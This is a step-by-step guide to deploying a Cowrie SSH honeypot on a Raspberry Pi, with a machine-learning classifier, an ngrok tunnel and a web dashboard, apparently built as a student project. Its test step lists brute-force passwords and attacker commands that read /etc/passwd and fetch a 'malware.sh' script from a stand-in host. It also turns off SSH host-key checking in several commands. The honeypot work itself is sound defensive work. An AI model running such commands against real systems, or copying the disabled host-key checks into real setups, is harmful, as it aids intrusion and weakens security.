# FALSEDOOR: Step-by-Step Raspberry Pi & Ubuntu Setup Guide
*(Zero Git Clone • Detailed Implementation • Complete Port & Network Mapping)*

---

## 📌 System Specifications & Port Allocation

| Component | Host / Target | Port | Protocol | Purpose |
|---|---|---|---|---|
| **Raspberry Pi OS (Admin)** | `172.20.10.2` | **22** | TCP (SSH) | Your real management login (`ssh falsedoor@172.20.10.2`) |
| **Cowrie Honeypot Decoy** | `172.20.10.2` | **2222** | TCP (SSH) | The honeypot decoy trap where attackers connect |
| **FastAPI SOC Engine** | `172.20.10.2` | **8000** | HTTP | Real-time threat classification & REST API |
| **ngrok Local Web UI** | `127.0.0.1` | **4040** | HTTP | Tunnel diagnostic & status inspector |
| **ngrok Public Tunnel** | `*.ngrok-free.app` | **443** | HTTPS | Encrypted tunnel enabling Netlify to access Pi API |
| **Netlify Web Dashboard** | `falsedoor.netlify.app` | **443** | HTTPS | Real-time visual monitoring frontend |

---

## 💡 Important Explanations: Why Previous Errors Happened

### 1. Why "filename not matched" occurred
When zipping files on Windows PowerShell with default commands, Windows created file entries with backslashes (`server\main.py`). Linux does not recognize backslashes as folder separators, causing `unzip` to fail.  
**Fixed:** `FALSEDOOR_UBUNTU_DEPLOY.zip` has been rebuilt using standard Unix forward slashes (`server/main.py`), which unzips cleanly into proper subdirectories on Ubuntu.

### 2. Why `train_model.py` counter never changes
`ml/train_model.py` is a **one-time offline training script** that reads your static training dataset (`data/extracted_features.csv`) and generates the Random Forest classification brain (`ml/random_forest_model.pkl`).  
**It is NOT a live attack listener.**  
- Live attacks are recorded by **Cowrie** into `/home/falsedoor/FALSEDOOR/var/log/cowrie/cowrie.json`.
- **FastAPI (`server/main.py`)** monitors `cowrie.json` continuously, runs incoming events through the Random Forest model, and provides the live counts on the dashboard.

### 3. Why "Port 8000 couldn't connect to server" occurred
- Modern web browsers block **Mixed Active Content**: when viewing the HTTPS Netlify dashboard (`https://falsedoor.netlify.app`), the browser refuses to connect directly to an insecure `http://172.20.10.2:8000` address.
- That is why the **ngrok HTTPS tunnel** is required for Netlify, or you view the dashboard locally via `http://172.20.10.2:8000`.

---

## 🚀 STEP-BY-STEP INSTALLATION WORKFLOW

---

### STEP 1: Transfer Project Files from Windows to Raspberry Pi (No Git Clone)

Open **PowerShell** on your Windows PC:

```powershell
# Copy the pre-packaged zip to your Raspberry Pi home folder
scp -o StrictHostKeyChecking=no "C:\Users\ELs\Downloads\UITM\FYP\terst\FALSEDOOR_UBUNTU_DEPLOY.zip" falsedoor@172.20.10.2:/home/falsedoor/
```

> **Note on "Host key verification failed":**  
> If Windows ever blocks your connection because the Pi's SSH key changed, run:  
> `ssh-keygen -R 172.20.10.2`  
> *(This clears the old key cache automatically).*

> **Alternative (GUI):** You can also open **WinSCP** or **FileZilla**, connect to Host `172.20.10.2`, Port `22`, Username `falsedoor`, and drag-and-drop `FALSEDOOR_UBUNTU_DEPLOY.zip` into `/home/falsedoor/`.

---

### STEP 2: Connect to Raspberry Pi & Extract Files

From PowerShell or Terminal, connect to your Pi:

```bash
ssh -o StrictHostKeyChecking=no falsedoor@172.20.10.2
```

Once logged in as `falsedoor@172.20.10.2`, create the target directory and extract the archive:

```bash
# 1. Create FALSEDOOR folder
mkdir -p ~/FALSEDOOR

# 2. Extract cleanly (overwriting any previous corrupt files)
unzip -o ~/FALSEDOOR_UBUNTU_DEPLOY.zip -d ~/FALSEDOOR/

# 3. Enter project directory
cd ~/FALSEDOOR

# 4. Make all scripts executable
chmod +x start.sh
chmod +x server/*.sh 2>/dev/null || true
chmod +x ml/*.py 2>/dev/null || true
```

Verify that the files extracted into proper folders:
```bash
ls -la
ls -la server/
ls -la ml/
```
*(You should see `start.sh`, `server/main.py`, `ml/train_model.py`, and `data/extracted_features.csv`.)*

---

### STEP 3: Configure Ubuntu Firewall (UFW)

Ensure all required ports are opened on the Pi:

```bash
# 1. Keep real SSH open (Port 22) - CRITICAL so you don't lock yourself out!
sudo ufw allow 22/tcp

# 2. Open Cowrie Honeypot port (Port 2222)
sudo ufw allow 2222/tcp

# 3. Open FastAPI SOC Engine port (Port 8000)
sudo ufw allow 8000/tcp

# 4. Enable firewall & verify status
sudo ufw --force enable
sudo ufw status verbose
```

---

### STEP 4: Set Up Python Virtual Environment & Dependencies

Install system dependencies and build the virtual environment for FastAPI and Scikit-Learn:

```bash
# 1. Install system Python packages
sudo apt update
sudo apt install -y python3 python3-pip python3-venv curl net-tools

# 2. Set up virtual environment inside server folder
cd ~/FALSEDOOR
python3 -m venv server/venv

# 3. Activate environment & upgrade pip
source server/venv/bin/activate
pip install --upgrade pip

# 4. Install backend dependencies (FastAPI, Scikit-Learn, Pandas, Uvicorn)
pip install -r server/requirements.txt
```

Verify that Python and Scikit-Learn are working properly:
```bash
python3 -c "import fastapi, uvicorn, sklearn, pandas; print('✓ All Python packages loaded successfully!')"
```

---

### STEP 5: Verify the Random Forest Machine Learning Model

Your pre-trained model `ml/random_forest_model.pkl` is already included. You can verify it or re-train it anytime:

```bash
cd ~/FALSEDOOR
source server/venv/bin/activate
python3 ml/train_model.py
```

Expected output:
```text
Dataset loaded.
Total records: 17
Training Random Forest Classifier (n_estimators=100)...
Model training complete!
Model saved to: ml/random_forest_model.pkl
```

---

### STEP 6: Initialize & Start Cowrie Honeypot (Port 2222)

Your `cowrie-env` is inside `~/FALSEDOOR/cowrie-env`. Modern Cowrie needs to initialize its directory layout once with `cowrie init`.

Run these commands inside `~/FALSEDOOR`:

```bash
cd ~/FALSEDOOR

# 1. Activate the environment (if not already active)
source cowrie-env/bin/activate

# 2. Initialize Cowrie workspace (creates config & dirs)
cowrie init

# 3. Start Cowrie Honeypot
cowrie start

# 4. Verify Cowrie status
cowrie status
```

You should see:
```text
twistd is running
```

To verify port 2222 is actively listening:
```bash
nc -zv 127.0.0.1 2222
# Or:
sudo netstat -tlpn | grep 2222
```

---

### STEP 7: One-Click Master Launch (`start.sh`)

Now launch all services (FastAPI backend + Cowrie verification + ngrok tunnel) with one command:

```bash
cd ~/FALSEDOOR
bash start.sh
```

The script will display:
```text
╔══════════════════════════════════════════════════════════════════╗
║             FALSEDOOR — ONE-CLICK LAUNCHER v2.1                  ║
╚══════════════════════════════════════════════════════════════════╝
    ✓ Cowrie started!
    ✓ FastAPI running (PID: xxxxx)
    ✓ UFW ports 8000 & 2222 opened.

╔══════════════════════════════════════════════════════════════════════════╗
║                           FALSEDOOR IS INBOUND                           ║
╠══════════════════════════════════════════════════════════════════════════╣
║                                                                          ║
║  Honeypot SSH Port : 2222 (Ready for attacker connections)               ║
║  Local API         : http://172.20.10.2:8000                             ║
║  Public Stream URL : https://geriatric-alibi-refinance.ngrok-free.dev    ║
║  Attack Target     : ssh -p 2222 root@172.20.10.2                        ║
║  Dashboard Status  : Active & Sniffing Inbound Telemetry                 ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
```

> **Tip:** Leave this terminal running so services stay active.

---

### STEP 8: Test API & Diagnostic Endpoint

Open a second terminal or run on the Pi:

```bash
# 1. Check health
curl http://localhost:8000/api/health

# 2. Check full diagnostic status
curl http://localhost:8000/api/debug | python3 -m json.tool
```

The debug output will confirm:
- `cowrie_running: true`
- `cowrie_log_dir_exists: true`
- `total_lines_across_all_logs`: Total events captured
- `last_3_raw_events`: Shows your attacks in real time

---

### STEP 9: Connect the Netlify Dashboard

1. Open your browser and go to: **[https://falsedoor.netlify.app/](https://falsedoor.netlify.app/)**
2. Click the fingerprint scanner to access the dashboard.
3. Click the **`[STREAMING LIVE]`** / **Connection Status** badge at the top right of the navigation bar.
4. Paste your public ngrok URL generated in Step 7:
   ```text
   https://xxxx-xx-xx-xx.ngrok-free.app
   ```
5. Click **`Save & Connect`**.

The dashboard will instantly switch to **`ONLINE`** and begin polling your Raspberry Pi every 3 seconds!

---

### STEP 10: Simulate Live Attacks & Watch Data Entry

From your attacker laptop, PC, or another terminal:

```bash
# 1. Attack the Honeypot Decoy (Port 2222)
ssh root@172.20.10.2 -p 2222
```

Try common brute-force passwords:
```text
admin
123456
root
ubuntu
meow
```

Once logged in, execute commands:
```bash
uname -a
whoami
cat /etc/passwd
wget http://example.com/malware.sh
exit
```

#### What happens now:
1. **Cowrie** logs the connection, credentials, commands, and session termination into `var/log/cowrie/cowrie.json`.
2. **FastAPI** detects the new log entry within 1 second.
3. The **Random Forest Classifier** extracts 8 features and classifies the event:
   - `Brute Force`
   - `Command Execution`
   - `Malware Download Attempt`
4. The **Netlify Dashboard** updates automatically:
   - Total attack counter ticks up.
   - Live Attack Feed shows the event with attacker IP, command, and ML confidence.
   - Threat Distribution charts shift dynamically.

---

## 🛠️ Quick Troubleshooting Guide

| Problem | Cause | Solution |
|---|---|---|
| `ssh: connect to host 172.20.10.2 port 2222: Connection refused` | Cowrie honeypot is stopped | Run `cd ~/FALSEDOOR && bin/cowrie start` |
| `Port 8000 couldn't connect` on Netlify | Browser blocked insecure HTTP | Use your `https://xxxx.ngrok-free.app` URL in the Netlify connection popup |
| `scp: Connection timed out` | Wrong IP or Pi WiFi disconnected | Confirm Pi IP on Pi terminal with `hostname -I` |
| `python3: command not found` | Python not installed | Run `sudo apt update && sudo apt install -y python3 python3-pip python3-venv` |
| Want to restart everything cleanly | Stale processes | Run `pkill -f uvicorn; pkill -f cowrie; pkill -f ngrok` then `bash start.sh` |

---

## 🛑 Safe Shutdown & Stopping Services (Prevent SD Card Corruption)

> [!WARNING]
> **NEVER directly unplug the Raspberry Pi power cable!**  
> Linux buffers write operations in RAM. Abrupt power loss corrupts the MicroSD card filesystem. Always flush disk caches and shut down cleanly using the methods below.

### Scenario A: Stop Services Only (Keep Raspberry Pi Running)
Run these commands on the Pi:
```bash
# 1. Stop Cowrie Honeypot cleanly
cd ~/FALSEDOOR
source cowrie-env/bin/activate 2>/dev/null || true
cowrie stop

# 2. Stop FastAPI and ngrok
pkill -f "python3.*main.py" 2>/dev/null || true
pkill -f "uvicorn" 2>/dev/null || true
pkill -f "ngrok" 2>/dev/null || true

# 3. Flush RAM write buffers to disk
sync
```
*All FALSEDOOR ports (2222, 8000) are now closed. Your Pi stays online and you can still SSH into it anytime.*

---

### Scenario B: Completely Power Off the Raspberry Pi Safely
When you are done testing and want to pack up or turn off the Raspberry Pi:

```bash
# 1. Stop services and flush disk caches
cd ~/FALSEDOOR
source cowrie-env/bin/activate 2>/dev/null || true
cowrie stop
pkill -f "uvicorn" 2>/dev/null || true
pkill -f "ngrok" 2>/dev/null || true
sync && sync

# 2. Command clean shutdown
sudo shutdown -h now
```

> [!IMPORTANT]
> **Wait for the Green LED (ACT) to stop blinking completely (~15–20 seconds).**  
> Once only the solid red power LED remains lit (or the green light completely turns off), it is 100% safe to unplug the power cord without any risk of corruption.
